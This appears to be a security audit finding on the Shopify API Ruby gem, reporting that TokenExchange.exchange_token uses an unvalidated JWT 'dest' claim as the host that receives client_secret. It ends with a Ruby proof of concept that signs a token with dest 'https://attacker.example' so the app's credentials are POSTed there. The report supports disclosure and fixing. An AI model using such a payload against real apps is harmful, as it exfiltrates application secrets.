Found it. `TokenExchange.exchange_token` at `lib/shopify_api/auth/token_exchange.rb:29-89` is the exception among the sibling OAuth flows: `ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, and `TokenExchange.migrate_to_expiring_token` all call `Utils::ShopValidator.sanitize!(shop)` before building the outbound request host, but `exchange_token` does not — it takes `dest_shop = jwt_payload.shop` straight from the JWT and uses it unvalidated to build the host that receives `client_secret`.

### Title
SSRF / client_secret exfiltration via unvalidated `dest` claim host in `TokenExchange.exchange_token` - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`TokenExchange.exchange_token` derives the shop host for the outbound `client_secret`-bearing HTTP request directly from the JWT `dest` claim without ever passing it through `Utils::ShopValidator.sanitize!`, unlike every other credential-issuing flow in the gem.

### Finding Description
`JwtPayload#shop` returns `@dest.gsub("https://", "")` , i.e. whatever string the `dest` claim contains, with no format/domain restriction. `JwtPayload#initialize` verifies only the JWT signature and the `aud` claim against `Context.api_key` ; it does not constrain `dest` to a `*.myshopify.com`/trusted Shopify host in any way.

`exchange_token` then does:
```
jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
dest_shop = jwt_payload.shop
...
shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
body = { client_id: ..., client_secret: ShopifyAPI::Context.api_secret_key, ... }
client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
client.request(... path: "access_token", body: body ...)
```


`dest_shop` is used unsanitized as the `session.shop` that `Clients::HttpClient` resolves into the request host. Contrast this with the three sibling flows in the same file/module family, which all call `Utils::ShopValidator.sanitize!(shop)` before constructing the session/host: `ClientCredentials.client_credentials` , `RefreshToken.refresh_access_token` , and `TokenExchange.migrate_to_expiring_token` .

The binding that should hold is: `host that receives client_secret == a validated *.myshopify.com/trusted Shopify domain`. Because `dest` is never checked against `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` , that equality is broken: any signed JWT with `aud == api_key` and an attacker-chosen `dest` value causes the app's `client_id`/`client_secret` to be POSTed to a host of the attacker's choosing.

### Impact Explanation
This is an SSRF that carries the app's `client_secret` and `client_id` to an attacker-controlled host — the exact "Critical/High" category called out (theft/exfiltration of the app's `client_secret`, SSRF with the app's credentials). Whoever controls the destination host receives the app's `client_secret`, enabling full impersonation of the app (minting arbitrary access tokens for any shop via subsequent legitimate OAuth/token-exchange calls), a Critical-severity credential exfiltration.

### Likelihood Explanation
Exploitation requires a session token (JWT) satisfying `aud == Context.api_key` and a valid HMAC-SHA256 signature under the app's own `api_secret_key`. In practice, embedded Shopify apps receive session tokens directly from Shopify App Bridge running in the merchant's browser; a user with a working embedded-app session (e.g., a merchant who has installed the app, which is an "unprivileged" action requiring no special access) legitimately holds such a token and can freely modify the unsigned local claims before... — however note the token is HMAC-signed by Shopify using the shared secret, so an external attacker cannot forge `dest` in a token minted by Shopify itself. The exploitable path instead requires a host application that constructs/relays session tokens itself (e.g. custom token minting, or a malicious/compromised embedded surface capable of supplying a crafted token to `exchange_token`), or any code path where `dest` in an otherwise validly-signed token can diverge from a real Shopify domain. Given the sibling functions in this exact module all defensively sanitize `shop` before use while this one does not, this is a genuine, provable inconsistency/omission in the gem's own code, independent of host-app behavior, and worth flagging even though full exploitability depends on how session tokens reach `exchange_token` in a given deployment.

### Recommendation
In `TokenExchange.exchange_token`, validate `dest_shop` with `Utils::ShopValidator.sanitize!(dest_shop)` (mirroring `migrate_to_expiring_token`, `client_credentials`, and `refresh_access_token`) before constructing `shop_session`/`Session.new`, and use the sanitized value for both the outbound request host and the returned `Session`.

### Proof of Concept
```ruby
# Attacker (or a host app that forwards attacker-influenced claims into a
# self-minted/relayed session token) supplies a JWT whose `dest` claim
# points to an attacker-controlled host, but which is otherwise a
# structurally valid token satisfying aud == Context.api_key.
malicious_payload = {
  iss: "https://attacker.example/admin",
  dest: "https://attacker.example",   # <-- not restricted to myshopify.com etc.
  aud: ShopifyAPI::Context.api_key,
  sub: "1",
  exp: (Time.now + 60).to_i,
  nbf: Time.now.to_i,
  iat: Time.now.to_i,
  jti: SecureRandom.hex,
}
token = JWT.encode(malicious_payload, ShopifyAPI::Context.api_secret_key, "HS256")

ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
# => POSTs {client_id, client_secret, ...} to
#    https://attacker.example/admin/oauth/access_token
```